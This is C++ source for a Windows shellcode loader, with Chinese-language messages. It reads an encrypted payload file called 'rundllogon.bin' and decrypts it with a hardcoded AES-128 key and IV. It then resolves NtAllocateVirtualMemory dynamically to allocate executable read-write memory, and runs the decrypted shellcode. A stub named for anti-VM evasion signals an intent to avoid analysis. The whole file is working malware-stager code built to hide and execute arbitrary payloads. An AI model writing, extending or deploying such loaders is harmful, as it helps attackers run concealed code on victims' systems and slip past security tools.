#include <openssl/evp.h>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <winternl.h>
#include <vector>

#define AES_BLOCK_SIZE 16  



unsigned char AES_KEY[16] = {
    0xB0, 0x49, 0x8C, 0xB5, 0x0D, 0x52, 0x0D, 0x77,
    0x07, 0xE5, 0xCE, 0x31, 0x0D, 0x1F, 0x1C, 0x85
};


unsigned char AES_IV[16] = {
    0xAF, 0xA4, 0xDF, 0xAA, 0xB8, 0x87, 0x19, 0xF5,
    0x48, 0x31, 0x45, 0xAC, 0x83, 0x5D, 0xC5, 0xD5
};


std::vector<unsigned char> LoadEncryptedShellcode(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    return std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}


std::vector<unsigned char> AESDecrypt(const std::vector<unsigned char>& encryptedShellcode) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        std::cerr << "EVP_CIPHER_CTX 初始化失败！" << std::endl;
        return {};
    }


    size_t len = 0, decrypted_len = 0;


    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, AES_KEY, AES_IV) != 1) {
        std::cerr << "AES 解密初始化失败！" << std::endl;
        return {};
    }


    std::vector<unsigned char> decryptedShellcode(encryptedShellcode.size() + AES_BLOCK_SIZE);


    if (EVP_DecryptUpdate(ctx, decryptedShellcode.data(), (int*)&len, encryptedShellcode.data(), encryptedShellcode.size()) != 1) {
        std::cerr << "AES 解密失败！" << std::endl;
        return {};
    }
    decrypted_len += len;


    if (EVP_DecryptFinal_ex(ctx, decryptedShellcode.data() + decrypted_len, (int*)&len) != 1) {
        std::cerr << "AES Final 解密失败！" << std::endl;
        return {};
    }
    decrypted_len += len;


    EVP_CIPHER_CTX_free(ctx);


    decryptedShellcode.resize(decrypted_len);
    return decryptedShellcode;
}

typedef NTSTATUS(WINAPI* pNtAllocMem)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

void RunTask(const std::vector<unsigned char>& payload) {
    void* mem_region = nullptr;
    SIZE_T mem_size = payload.size();


    pNtAllocMem FnAllocMem = (pNtAllocMem)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");

    if (FnAllocMem) {
        NTSTATUS status = FnAllocMem(
            GetCurrentProcess(),
            &mem_region,
            0,
            &mem_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (status == 0) {
            std::cout << "Memory allocated at: " << mem_region << std::endl;
            memcpy(mem_region, payload.data(), payload.size());
            ((void(*)())mem_region)();
        }
        else {
            std::cerr << "Memory allocation failed, Status Code: " << std::hex << status << std::endl;
        }
    }
}

void AntiVMNoise() {
    SYSTEMTIME t;
    GetSystemTime(&t);
    t.wMilliseconds += 1;
    t.wDay += 1;
}

int main() {
    AntiVMNoise();
    std::vector<unsigned char> encryptedShellcode = LoadEncryptedShellcode("rundllogon.bin");

    if (encryptedShellcode.empty()) {
        std::cerr << "无法加载 shellcode.bin\n";
        return -1;
    }

    std::vector<unsigned char> shellcode = AESDecrypt(encryptedShellcode);

    if (shellcode.empty()) {
        std::cerr << "解密失败！请检查密钥和 IV 是否正确。\n";
        return -1;
    }

    std::cout << "解密完成，Shellcode 长度：" << shellcode.size() << " 字节\n";

    if (shellcode.empty()) {
        std::cerr << "Shellcode 为空，无法执行！" << std::endl;
        return -1;
    }

    std::cout << "Shellcode 长度：" << shellcode.size() << " 字节，开始执行..." << std::endl;
    RunTask(shellcode);

    return 0;
}
